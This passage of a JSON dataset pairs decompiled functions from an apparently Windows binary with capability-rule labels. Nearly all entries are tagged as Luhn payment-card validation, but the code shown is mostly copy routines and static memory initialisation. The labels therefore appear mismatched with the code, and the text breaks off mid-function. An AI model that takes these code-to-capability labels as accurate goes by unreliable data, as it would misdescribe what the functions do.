        "decompiled_code": "\nint64_t fcn.140095d50(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    \n    uVar1 = *(arg2 + 0x18);\n    uVar2 = *(arg2 + 0x1c);\n    uVar3 = *(arg2 + 0x20);\n    uVar4 = *(arg2 + 0x24);\n    uVar5 = *(arg2 + 0x28);\n    uVar6 = *(arg2 + 0x2c);\n    uVar7 = *(arg2 + 0x30);\n    uVar8 = *(arg2 + 0x34);\n    uVar9 = *(arg2 + 0xc);\n    uVar10 = *(arg2 + 0x10);\n    uVar11 = *(arg2 + 0x14);\n    *(arg1 + 8) = *(arg2 + 8);\n    *(arg1 + 0xc) = uVar9;\n    *(arg1 + 0x10) = uVar10;\n    *(arg1 + 0x14) = uVar11;\n    *(arg1 + 0x18) = uVar1;\n    *(arg1 + 0x1c) = uVar2;\n    *(arg1 + 0x20) = uVar3;\n    *(arg1 + 0x24) = uVar4;\n    *(arg1 + 0x28) = uVar5;\n    *(arg1 + 0x2c) = uVar6;\n    *(arg1 + 0x30) = uVar7;\n    *(arg1 + 0x34) = uVar8;\n    fcn.14009fb80(arg1 + 0x38, arg2 + 0x38);\n    return arg1;\n}\n",
        "token_count": 458
    },
    "1400960e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400960e0(int64_t *arg1)\n\n{\n    if (arg1[2] < arg1[3]) {\n        arg1[2] = arg1[2] + 2;\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0001400960fb. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(*arg1 + 0x50))();\n    return;\n}\n",
        "token_count": 105
    },
    "1400966b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400966b0(ulong *arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    \n    *arg1 = 0x14010b0f0;\n    arg1[1] = *(arg2 + 8);\n    arg1[2] = *(arg2 + 0x10);\n    arg1[3] = *(arg2 + 0x18);\n    arg1[4] = *(arg2 + 0x20);\n    arg1[5] = *(arg2 + 0x28);\n    arg1[6] = *(arg2 + 0x30);\n    piVar1 = *(arg2 + 0x38);\n    bVar2 = piVar1 != *0x1400fb720;\n    arg1[7] = piVar1;\n    if (bVar2) {\n        if (**0x140102a70 != 0) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n            return;\n        }\n        *piVar1 = *piVar1 + 1;\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "1400967c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400967c0(int64_t arg1, int64_t arg2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    \n    uVar1 = *(arg2 + 0x18);\n    uVar2 = *(arg2 + 0x1c);\n    uVar3 = *(arg2 + 0x20);\n    uVar4 = *(arg2 + 0x24);\n    uVar5 = *(arg2 + 0x28);\n    uVar6 = *(arg2 + 0x2c);\n    uVar7 = *(arg2 + 0x30);\n    uVar8 = *(arg2 + 0x34);\n    uVar9 = *(arg2 + 0xc);\n    uVar10 = *(arg2 + 0x10);\n    uVar11 = *(arg2 + 0x14);\n    *(arg1 + 8) = *(arg2 + 8);\n    *(arg1 + 0xc) = uVar9;\n    *(arg1 + 0x10) = uVar10;\n    *(arg1 + 0x14) = uVar11;\n    *(arg1 + 0x18) = uVar1;\n    *(arg1 + 0x1c) = uVar2;\n    *(arg1 + 0x20) = uVar3;\n    *(arg1 + 0x24) = uVar4;\n    *(arg1 + 0x28) = uVar5;\n    *(arg1 + 0x2c) = uVar6;\n    *(arg1 + 0x30) = uVar7;\n    *(arg1 + 0x34) = uVar8;\n    fcn.14009fb80(arg1 + 0x38, arg2 + 0x38);\n    return arg1;\n}\n",
        "token_count": 459
    },
    "14009768": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140097680(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x1401032f0 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.140075be0(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x140103370 + 0x10;\n    return;\n}\n",
        "token_count": 139
    },
    "1400989d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400989d0(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = *0x140103240 + 0x10;\n    iVar1 = -1;\n    if (arg2 != 0) {\n        iVar1 = sub.msvcrt.dll_strlen(arg2);\n        iVar1 = arg2 + iVar1;\n    }\n    iVar1 = fcn.140075be0(arg2, iVar1);\n    arg1[1] = iVar1;\n    *arg1 = *0x1401033a0 + 0x10;\n    return;\n}\n",
        "token_count": 141
    },
    "14009c93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.14009c930(ulong *arg1, int64_t arg2)\n\n{\n    uchar uVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    \n    *(arg1 + 1) = arg2 != 0;\n    *arg1 = 0x14010be40;\n    uVar4 = fcn.14009f6c0();\n    arg1[2] = uVar4;\n    *(arg1 + 3) = 0;\n    iVar6 = 0;\n    do {\n        iVar3 = fcn.14000f950();\n        if (iVar3 == -1) {\n            uVar1 = 0;\n            goto code_r0x00014009c86f;\n        }\n        *(arg1 + iVar6 + 0x19) = iVar3;\n        iVar6 = iVar6 + 1;\n    } while (iVar6 != 0x80);\n    uVar1 = 1;\ncode_r0x00014009c86f:\n    *(arg1 + 3) = uVar1;\n    uVar5 = 0;\n    do {\n        uVar2 = fcn.14000f8e0(uVar5 & 0xffffffff);\n        *(arg1 + uVar5 * 2 + 0x9a) = uVar2;\n        uVar5 = uVar5 + 1;\n    } while (uVar5 != 0x100);\n    iVar6 = 0;\n    do {\n        *(arg1 + iVar6 * 2 + 0x29a) = 1 << (iVar6 & 0x1f);\n        uVar2 = fcn.140025e80();\n        *(arg1 + iVar6 * 2 + 0x2ba) = uVar2;\n        iVar6 = iVar6 + 1;\n    } while (iVar6 != 0x10);\n    return;\n}\n",
        "token_count": 438
    },
    "14009c9d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009c9d0(int64_t *arg1)\n\n{\n    *arg1 = 0x14010be40;\n    fcn.14009f7a0(arg1 + 2);\n    *arg1 = *0x140103420 + 0x10;\n    return;\n}\n",
        "token_count": 69
    },
    "14009cb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009cb40(int64_t arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    ulong uVar3;\n    ulong uVar4;\n    ulong uVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int32_t *piVar8;\n    ulong uVar9;\n    int64_t iVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    \n    uVar2 = *arg2;\n    uVar3 = arg2[1];\n    *0x1400fb4a0 = *0x140103510 + 0x10;\n    *0x1400fb4a8 = 1;\n    uVar4 = arg2[2];\n    *0x1400fb4b0 = uVar2;\n    fcn.1400adc80(0x1400fb4a0);\n    piVar8 = *0x140102a70;\n    if (**0x140102a70 != 0) {\n        LOCK();\n    }\n    *0x1400fb4a8 = *0x1400fb4a8 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140102f90);\n    *(iVar12 + iVar10 * 8) = 0x1400fb4a0;\n    *0x1400fb5c8 = 1;\n    *0x1400fb5c0 = *0x1401034a0 + 0x10;\n    *0x1400fb5d0 = fcn.14009f6c0();\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1400fb5c8 = *0x1400fb5c8 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140102ee0);\n    *(iVar12 + iVar10 * 8) = 0x1400fb5c0;\n    *0x1400fb548 = 1;\n    *0x1400fb540 = *0x140103200 + 0x10;\n    *0x1400fb550 = uVar3;\n    fcn.140078c40(0x1400fb540);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1400fb548 = *0x1400fb548 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140102be0);\n    *(iVar12 + iVar10 * 8) = 0x1400fb540;\n    *0x1400fb568 = 1;\n    *0x1400fb560 = *0x140103210 + 0x10;\n    *0x1400fb570 = uVar4;\n    fcn.140079010(0x1400fb560);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1400fb568 = *0x1400fb568 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140102bf0);\n    *(iVar12 + iVar10 * 8) = 0x1400fb560;\n    *0x1400fb500 = *0x1401035a0 + 0x10;\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1400fb508 = 2;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140103000);\n    *(iVar12 + iVar10 * 8) = 0x1400fb500;\n    *0x1400fb520 = *0x1401035c0 + 0x10;\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1400fb528 = 2;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140103020);\n    *(iVar12 + iVar10 * 8) = 0x1400fb520;\n    *0x1400fb4e0 = *0x140103530 + 0x10;\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1400fb4e8 = 2;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140102fb0);\n    *(iVar12 + iVar10 * 8) = 0x1400fb4e0;\n    fcn.1400ad930(0x1400fb460, 1);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1400fb468 = *0x1400fb468 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140102f70);\n    *(iVar12 + iVar10 * 8) = 0x1400fb460;\n    uVar5 = arg2[5];\n    uVar6 = arg2[3];\n    uVar7 = arg2[4];\n    *0x1400fb4c8 = 1;\n    *0x1400fb4c0 = *0x140103520 + 0x10;\n    *0x1400fb4d0 = uVar6;\n    fcn.1400ae040(0x1400fb4c0);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1400fb4c8 = *0x1400fb4c8 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140102fa0);\n    *(iVar12 + iVar10 * 8) = 0x1400fb4c0;\n    *0x1400fb5e8 = 1;\n    *0x1400fb5e0 = *0x1401034b0 + 0x10;\n    *0x1400fb5f0 = fcn.14009f6c0();\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1400fb5e8 = *0x1400fb5e8 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140102ef0);\n    *(iVar12 + iVar10 * 8) = 0x1400fb5e0;\n    *0x1400fb588 = 1;\n    *0x1400fb580 = *0x140103220 + 0x10;\n    *0x1400fb590 = uVar7;\n    fcn.1400793e0(0x1400fb580);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1400fb588 = *0x1400fb588 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140102c00);\n    *(iVar12 + iVar10 * 8) = 0x1400fb580;\n    *0x1400fb5a8 = 1;\n    *0x1400fb5a0 = *0x140103230 + 0x10;\n    *0x1400fb5b0 = uVar5;\n    fcn.1400797c0(0x1400fb5a0);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1400fb5a8 = *0x1400fb5a8 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140102c10);\n    iVar1 = *piVar8;\n    *(iVar12 + iVar10 * 8) = 0x1400fb5a0;\n    *0x1400fb510 = *0x1401035b0 + 0x10;\n    if (iVar1 != 0) {\n        LOCK();\n    }\n    *0x1400fb518 = 2;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140103010);\n    iVar1 = *piVar8;\n    *(iVar12 + iVar10 * 8) = 0x1400fb510;\n    *0x1400fb530 = *0x1401035d0 + 0x10;\n    if (iVar1 != 0) {\n        LOCK();\n    }\n    *0x1400fb538 = 2;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140103030);\n    iVar1 = *piVar8;\n    *(iVar12 + iVar10 * 8) = 0x1400fb530;\n    *0x1400fb4f0 = *0x140103540 + 0x10;\n    if (iVar1 != 0) {\n        LOCK();\n    }\n    *0x1400fb4f8 = 2;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140102fc0);\n    *(iVar12 + iVar10 * 8) = 0x1400fb4f0;\n    fcn.1400adb00(0x1400fb480, 1);\n    if (*piVar8 != 0) {\n        LOCK();\n    }\n    *0x1400fb488 = *0x1400fb488 + 1;\n    iVar12 = *(arg1 + 8);\n    iVar10 = fcn.1400261c0(*0x140102f80);\n    uVar9 = *0x140102f90;\n    *(iVar12 + iVar10 * 8) = 0x1400fb480;\n    iVar12 = *(arg1 + 0x18);\n    iVar10 = fcn.1400261c0(uVar9);\n    uVar9 = *0x140102be0;\n    *(iVar12 + iVar10 * 8) = uVar2;\n    iVar12 = *(arg1 + 0x18);\n    iVar10 = fcn.1400261c0(uVar9);\n    uVar2 = *0x140102bf0;\n    *(iVar12 + iVar10 * 8) = uVar3;\n    iVar12 = *(arg1 + 0x18);\n    iVar10 = fcn.1400261c0(uVar2);\n    uVar2 = *0x140102fa0;\n    *(iVar12 + iVar10 * 8) = uVar4;\n    iVar12 = *(arg1 + 0x18);\n    iVar10 = fcn.1400261c0(uVar2);\n    uVar2 = *0x140102c00;\n    *(iVar12 + iVar10 * 8) = uVar6;\n    iVar12 = *(arg1 + 0x18);\n    iVar11 = fcn.1400261c0(uVar2);\n    uVar2 = *0x140102c10;\n    iVar10 = *(arg1 + 0x18);\n    *(iVar12 + iVar11 * 8) = uVar7;\n    iVar12 = fcn.1400261c0(uVar2);\n    *(iVar10 + iVar12 * 8) = uVar5;\n    return;\n}\n",
        "token_count": 2623
    },
    "14009e67": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.14009e670(uint *arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    ushort *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong *puVar6;\n    uchar auStack168 [16];\n    uchar auStack152 [16];\n    uchar auStack136 [16];\n    \n    *0x1400fa808 = 0;\n    *0x1400fa7e8 = 0;\n    *0x1400fa7ec = 0;\n    *0x1400fa7f0 = 0;\n    *0x1400fa7f4 = 0;\n    *0x1400fa7f8 = 0;\n    *0x1400fa7fc = 0;\n    *0x1400fa800 = 0;\n    *0x1400fa804 = 0;\n    *arg1 = arg2;\n    *(arg1 + 4) = 0x30;\n    puVar6 = 0x1400faa20;\n    for (iVar5 = 0x30; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *(arg1 + 2) = 0x1400faa20;\n    *(arg1 + 6) = 0x1400fa820;\n    puVar6 = 0x1400fa820;\n    for (iVar5 = 0x30; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *(arg1 + 8) = 0x1400fa7e0;\n    *0x1400fa7e0 = 0x1400fa290;\n    puVar2 = fcn.14009f6b0(0);\n    *0x1400fa290 = *puVar2;\n    fcn.14009c630(0x1400fa2a0, 0, 0, 1);\n    fcn.14009dcf0(arg1, *0x140102d10, 0x1400fa2a0);\n    fcn.1400abc20(0x1400fa9a0, 1);\n    fcn.14009dcf0(arg1, *0x140102ec0, 0x1400fa9a0);\n    *0x1400f9ba8 = 1;\n    *0x1400f9ba0 = *0x140103380 + 0x10;\n    *0x1400f9bc0 = 0;\n    *0x1400f9bb0 = 0;\n    *0x1400f9900 = *0x140103150 + 0x10;\n    *0x1400f9bb8 = 0;\n    *0x1400f9bc8 = 0;\n    *0x1400f9bd0 = 0;\n    *0x1400f9bd8 = 0;\n    *0x1400f9be0 = 0;\n    *0x1400f9be8 = 0;\n    *0x1400f9c28 = 0;\n    *0x1400f9908 = 1;\n    *0x1400f9910 = 0x1400f9ba0;\n    fcn.1400ab020(0x1400f9900);\n    fcn.14009dcf0(arg1, *0x140102e00, 0x1400f9900);\n    *0x1400faba8 = 1;\n    *0x1400faba0 = *0x1401034c0 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102f00, 0x1400faba0);\n    *0x1400fabc8 = 1;\n    *0x1400fabc0 = *0x1401034e0 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102f20, 0x1400fabc0);\n    *0x1400fa9e8 = 1;\n    *0x1400fa9e0 = *0x140103130 + 0x10;\n    *0x1400fa9f0 = fcn.14009f6c0();\n    fcn.14009dcf0(arg1, *0x140102dc0, 0x1400fa9e0);\n    *0x1400fa068 = 1;\n    *0x1400fa060 = *0x1401033d0 + 0x10;\n    *0x1400fa080 = 0;\n    *0x1400fa070 = 0;\n    *0x1400f9ac0 = *0x1401030f0 + 0x10;\n    *0x1400fa078 = 0;\n    *0x1400fa081 = 0;\n    *0x1400fa088 = 0;\n    *0x1400fa090 = 0;\n    *0x1400fa098 = 0;\n    *0x1400fa0a0 = 0;\n    *0x1400fa0a8 = 0;\n    *0x1400fa0b0 = 0;\n    *0x1400fa0b8 = 0;\n    *0x1400fa0bc = 0;\n    *0x1400fa0cf = 0;\n    *0x1400f9ac8 = 1;\n    *0x1400f9ad0 = 0x1400fa060;\n    fcn.14009fc30(0x1400f9ac0);\n    fcn.14009dcf0(arg1, *0x140102d80, 0x1400f9ac0);\n    *0x1400fa0e8 = 1;\n    *0x1400fa0e0 = *0x1401033e0 + 0x10;\n    *0x1400fa100 = 0;\n    *0x1400fa0f0 = 0;\n    *0x1400f9ae0 = *0x140103100 + 0x10;\n    *0x1400fa0f8 = 0;\n    *0x1400fa101 = 0;\n    *0x1400fa108 = 0;\n    *0x1400fa110 = 0;\n    *0x1400fa118 = 0;\n    *0x1400fa120 = 0;\n    *0x1400fa128 = 0;\n    *0x1400fa130 = 0;\n    *0x1400fa138 = 0;\n    *0x1400fa13c = 0;\n    *0x1400fa14f = 0;\n    *0x1400f9ae8 = 1;\n    *0x1400f9af0 = 0x1400fa0e0;\n    fcn.14009fff0(0x1400f9ae0);\n    fcn.14009dcf0(arg1, *0x140102d90, 0x1400f9ae0);\n    *0x1400f99a8 = 1;\n    *0x1400f99a0 = *0x140103190 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102e40, 0x1400f99a0);\n    *0x1400f99c8 = 1;\n    *0x1400f99c0 = *0x1401031b0 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102e60, 0x1400f99c0);\n    *0x1400f9d28 = 1;\n    *0x1400f9d20 = *0x1401033b0 + 0x10;\n    *0x1400f9ea8 = 0;\n    *0x1400f9ea0 = 0;\n    *0x1400f9d30 = 0;\n    *0x1400f9d34 = 0;\n    *0x1400f9d38 = 0;\n    *0x1400f9d3c = 0;\n    *0x1400f9d40 = 0;\n    *0x1400f9d44 = 0;\n    *0x1400f9d48 = 0;\n    *0x1400f9d4c = 0;\n    *0x1400f9d50 = 0;\n    *0x1400f9d54 = 0;\n    *0x1400f9d58 = 0;\n    *0x1400f9d5c = 0;\n    *0x1400f9d60 = 0;\n    *0x1400f9d64 = 0;\n    *0x1400f9d68 = 0;\n    *0x1400f9d6c = 0;\n    *0x1400f9d70 = 0;\n    *0x1400f9d74 = 0;\n    *0x1400f9d78 = 0;\n    *0x1400f9d7c = 0;\n    *0x1400f9d80 = 0;\n    *0x1400f9d84 = 0;\n    *0x1400f9d88 = 0;\n    *0x1400f9d8c = 0;\n    *0x1400f9d90 = 0;\n    *0x1400f9d94 = 0;\n    *0x1400f9d98 = 0;\n    *0x1400f9d9c = 0;\n    *0x1400f9da0 = 0;\n    *0x1400f9da4 = 0;\n    *0x1400f9da8 = 0;\n    *0x1400f9dac = 0;\n    *0x1400f9db0 = 0;\n    *0x1400f9db4 = 0;\n    *0x1400f9db8 = 0;\n    *0x1400f9dbc = 0;\n    *0x1400f9dc0 = 0;\n    *0x1400f9dc4 = 0;\n    *0x1400f9dc8 = 0;\n    *0x1400f9dcc = 0;\n    *0x1400f9dd0 = 0;\n    *0x1400f9dd4 = 0;\n    *0x1400f9dd8 = 0;\n    *0x1400f9ddc = 0;\n    *0x1400f9de0 = 0;\n    *0x1400f9de4 = 0;\n    *0x1400f9de8 = 0;\n    *0x1400f9dec = 0;\n    *0x1400f9df0 = 0;\n    *0x1400f9df4 = 0;\n    *0x1400f9df8 = 0;\n    *0x1400f9dfc = 0;\n    *0x1400f9e00 = 0;\n    *0x1400f9e04 = 0;\n    *0x1400f9e08 = 0;\n    *0x1400f9e0c = 0;\n    *0x1400f9e10 = 0;\n    *0x1400f9e14 = 0;\n    *0x1400f9e18 = 0;\n    *0x1400f9e1c = 0;\n    *0x1400f9e20 = 0;\n    *0x1400f9e24 = 0;\n    *0x1400f9e28 = 0;\n    *0x1400f9e2c = 0;\n    *0x1400f9e30 = 0;\n    *0x1400f9e34 = 0;\n    *0x1400f9e38 = 0;\n    *0x1400f9e3c = 0;\n    *0x1400f9e40 = 0;\n    *0x1400f9e44 = 0;\n    *0x1400f9e48 = 0;\n    *0x1400f9e4c = 0;\n    *0x1400f9e50 = 0;\n    *0x1400f9e54 = 0;\n    *0x1400f9e58 = 0;\n    *0x1400f9e5c = 0;\n    *0x1400f9e60 = 0;\n    *0x1400f9e64 = 0;\n    *0x1400f9e68 = 0;\n    *0x1400f9e6c = 0;\n    *0x1400f9e70 = 0;\n    *0x1400f9e74 = 0;\n    *0x1400f9e78 = 0;\n    *0x1400f9e7c = 0;\n    *0x1400f9e80 = 0;\n    *0x1400f9e84 = 0;\n    *0x1400f9e88 = 0;\n    *0x1400f9e8c = 0;\n    *0x1400f9e90 = 0;\n    *0x1400f9e94 = 0;\n    *0x1400f9e98 = 0;\n    *0x1400f9e9c = 0;\n    fcn.140079fa0(0x1400f99e0, 0x1400f9d20, 1);\n    fcn.14009dcf0(arg1, *0x140102c20, 0x1400f99e0);\n    *0x1400f9948 = 1;\n    *0x1400f9940 = *0x140103170 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102e20, 0x1400f9940);\n    *0x1400f9968 = 1;\n    *0x1400f9960 = *0x140103550 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102fd0, 0x1400f9960);\n    fcn.1400aacd0(0x1400f98c0, 1);\n    fcn.14009dcf0(arg1, *0x140102de0, 0x1400f98c0);\n    fcn.14009c930(0x1400fa4e0, 1);\n    fcn.14009dcf0(arg1, *0x140102d20, 0x1400fa4e0);\n    fcn.1400abd80(0x1400fa9c0, 1);\n    fcn.14009dcf0(arg1, *0x140102ed0, 0x1400fa9c0);\n    *0x1400f9c48 = 1;\n    *0x1400f9c40 = *0x140103390 + 0x10;\n    *0x1400f9c60 = 0;\n    *0x1400f9c50 = 0;\n    *0x1400f9920 = *0x140103160 + 0x10;\n    *0x1400f9c58 = 0;\n    *0x1400f9c68 = 0;\n    *0x1400f9c70 = 0;\n    *0x1400f9c78 = 0;\n    *0x1400f9c80 = 0;\n    *0x1400f9c88 = 0;\n    *0x1400f9d08 = 0;\n    *0x1400f9928 = 1;\n    *0x1400f9930 = 0x1400f9c40;\n    fcn.1400ab3d0(0x1400f9920);\n    fcn.14009dcf0(arg1, *0x140102e10, 0x1400f9920);\n    *0x1400fabb8 = 1;\n    *0x1400fabb0 = *0x1401034d0 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102f10, 0x1400fabb0);\n    *0x1400fabd8 = 1;\n    *0x1400fabd0 = *0x1401034f0 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102f30, 0x1400fabd0);\n    *0x1400faa08 = 1;\n    *0x1400faa00 = *0x140103140 + 0x10;\n    *0x1400faa10 = fcn.14009f6c0();\n    auStack168 = CONCAT88(0x1400fa060, 0x1400f9ba0);\n    auStack152 = CONCAT88(0x1400f9c40, 0x1400fa0e0);\n    auStack136 = CONCAT88(*0x1400fd5d0, 0x1400fa160);\n    fcn.14009dcf0(arg1, *0x140102dd0, 0x1400faa00);\n    *0x1400fa168 = 1;\n    *0x1400fa160 = *0x1401033f0 + 0x10;\n    *0x1400fa180 = 0;\n    *0x1400fa170 = 0;\n    *0x1400f9b00 = *0x140103110 + 0x10;\n    *0x1400fa178 = 0;\n    *0x1400fa182 = 0;\n    *0x1400fa188 = 0;\n    *0x1400fa190 = 0;\n    *0x1400fa198 = 0;\n    *0x1400fa1a0 = 0;\n    *0x1400fa1a8 = 0;\n    *0x1400fa1b0 = 0;\n    *0x1400fa1b8 = 0;\n    *0x1400fa1bc = 0;\n    *0x1400fa1da = 0;\n    *0x1400f9b08 = 1;\n    *0x1400f9b10 = 0x1400fa160;\n    fcn.1400a03b0(0x1400f9b00);\n    fcn.14009dcf0(arg1, *0x140102da0, 0x1400f9b00);\n    *0x1400fa1e8 = 1;\n    *0x1400fa1e0 = *0x140103400 + 0x10;\n    *0x1400fa200 = 0;\n    *0x1400fa1f0 = 0;\n    *0x1400f9b20 = *0x140103120 + 0x10;\n    *0x1400fa1f8 = 0;\n    *0x1400fa202 = 0;\n    *0x1400fa208 = 0;\n    *0x1400fa210 = 0;\n    *0x1400fa218 = 0;\n    *0x1400fa220 = 0;\n    *0x1400fa228 = 0;\n    *0x1400fa230 = 0;\n    *0x1400fa238 = 0;\n    *0x1400fa23c = 0;\n    *0x1400fa25a = 0;\n    *0x1400f9b28 = 1;\n    *0x1400f9b30 = 0x1400fa1e0;\n    fcn.1400a0780(0x1400f9b20);\n    fcn.14009dcf0(arg1, *0x140102db0, 0x1400f9b20);\n    *0x1400f99b8 = 1;\n    *0x1400f99b0 = *0x1401031a0 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102e50, 0x1400f99b0);\n    *0x1400f99d8 = 1;\n    *0x1400f99d0 = *0x1401031c0 + 0x10;\n    fcn.14009dcf0(arg1, *0x140102e70, 0x1400f99d0);\n    *0x1400f9ec8 = 1;\n    *0x1400f9ec0 = *0x1401033c0 + 0x10;\n    *0x1400fa048 = 0;\n    *0x1400fa040 = 0;\n    *0x1400f9ed0 = 0;\n    *0x1400f9ed4 = 0;\n    *0x1400f9ed8 = 0;\n    *0x1400f9edc = 0;\n    *0x1400f9ee0 = 0;\n    *0x1400f9ee4 = 0;\n    *0x1400f9ee8 = 0;\n    *0x1400f9eec = 0;\n    *0x1400f9ef0 = 0;\n    *0x1400f9ef4 = 0;\n    *0x1400f9ef8 = 0;\n    *0x1400f9efc = 0;\n    *0x1400f9f00 = 0;\n    *0x1400f9f04 = 0;\n    *0x1400f9f08 = 0;\n    *0x1400f9f0c = 0;\n    *0x1400f9f10 = 0;\n    *0x1400f9f14 = 0;\n    *0x1400f9f18 = 0;\n    *0x1400f9f1c = 0;\n    *0x1400f9f20 = 0;\n    *0x1400f9f24 = 0;\n    *0x1400f9f28 = 0;\n    *0x1400f9f2c = 0;\n    *0x1400f9f30 = 0;\n    *0x1400f9f34 = 0;\n    *0x1400f9f38 = 0;\n    *0x1400f9f3c = 0;\n    *0x1400f9f40 = 0;\n    *0x1400f9f44 = 0;\n    *0x1400f9f48 = 0;\n    *0x1400f9f4c = 0;\n    *0x1400f9f50 = 0;\n    *0x1400f9f54 = 0;\n    *0x1400f9f58 = 0;\n    *0x1400f9f5c = 0;\n    *0x1400f9f60 = 0;\n    *0x1400f9f64 = 0;\n    *0x1400f9f68 = 0;\n    *0x1400f9f6c = 0;\n    *0x1400f9f70 = 0;\n    *0x1400f9f74 = 0;\n    *0x1400f9f78 = 0;\n    *0x1400f9f7c = 0;\n    *0x1400f9f80 = 0;\n    *0x1400f9f84 = 0;\n    *0x1400f9f88 = 0;\n    *0x1400f9f8c = 0;\n    *0x1400f9f90 = 0;\n    *0x1400f9f94 = 0;\n    *0x1400f9f98 = 0;\n    *0x1400f9f9c = 0;\n    *0x1400f9fa0 = 0;\n    *0x1400f9fa4 = 0;\n    *0x1400f9fa8 = 0;\n    *0x1400f9fac = 0;\n    *0x1400f9fb0 = 0;\n    *0x1400f9fb4 = 0;\n    *0x1400f9fb8 = 0;\n    *0x1400f9fbc = 0;\n    *0x1400f9fc0 = 0;\n    *0x1400f9fc4 = 0;\n    *0x1400f9fc8 = 0;\n    *0x1400f9fcc = 0;\n    *0x1400f9fd0 = 0;\n    *0x1400f9fd4 = 0;\n    